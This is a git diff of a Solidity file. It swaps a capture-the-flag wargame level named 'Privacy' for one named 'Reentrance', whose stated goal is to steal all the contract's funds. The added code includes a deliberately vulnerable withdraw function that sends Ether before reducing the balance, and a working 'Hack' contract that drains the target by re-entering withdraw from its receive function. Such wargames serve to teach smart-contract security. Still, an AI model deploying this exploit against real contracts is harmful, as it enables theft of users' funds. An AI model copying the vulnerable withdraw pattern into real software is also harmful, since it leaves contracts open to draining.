@@ -1,31 +1,93 @@
+
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.7;
 
-contract Privacy {
+import '@openzeppelin/contracts/utils/math/SafeMath.sol';
 
-  bool public locked = true;
-  uint256 public ID = block.timestamp;
-  uint8 private flattening = 10;
-  uint8 private denomination = 255;
-  uint16 private awkwardness = uint16(block.timestamp);
-  bytes32[3] private data;
+/**
+The goal of this level is for you to steal all the funds from the contract.
 
-  constructor(bytes32[3] memory _data) {
-    data = _data;
-  }
+  Things that might help:
+
+    Untrusted contracts can execute code where you least expect it.
+    Fallback methods
+    Throw/revert bubbling
+    Sometimes the best way to attack a contract is with another contract.
+    See the Help page above, section "Beyond the console"
+
+**/
+contract Reentrance {
   
-  function unlock(bytes16 _key) public {
-    require(_key == bytes16(data[2]));
-    locked = false;
+  using SafeMath for uint256;
+  mapping(address => uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
   }
 
-  /*
-    A bunch of super advanced solidity algorithms...
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
 
-      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
-      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
-      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
-      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
-      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
-  */
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      require(result);
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+
+contract Helper {
+
+
+    function getBalance(address _add) public view returns(uint) {
+        return _add.balance;
+    }
+
+    function sendMoney(address _add) public payable {
+        (bool success,) = _add.call{value: msg.value}("");
+        require(success);
+    }
+
+}
+
+interface ReentranceI {
+    function withdraw(uint _amount) external;
+    function donate(address _to) external payable;
+    function balanceOf(address _who) external view returns (uint balance);
+    receive() external payable;
+}
+
+contract Hack {
+
+    ReentranceI deposit_contract;
+
+    uint attackAmount; 
+
+    uint target_value = 0.001 ether;
+
+    constructor(address payable _add)  {
+        deposit_contract = ReentranceI(_add);
+    }
+
+    function hack() public payable {
+        require(msg.value >= target_value);
+        deposit_contract.donate{value: msg.value}(address(this));
+        deposit_contract.withdraw(msg.value);
+    }
+
+    // Function to receive Ether. msg.data must be empty
+    receive() external payable {
+      uint target_balance = address(deposit_contract).balance;
+      if (target_balance >= target_value) {
+        deposit_contract.withdraw(target_value);
+      }
+    }
+
 }
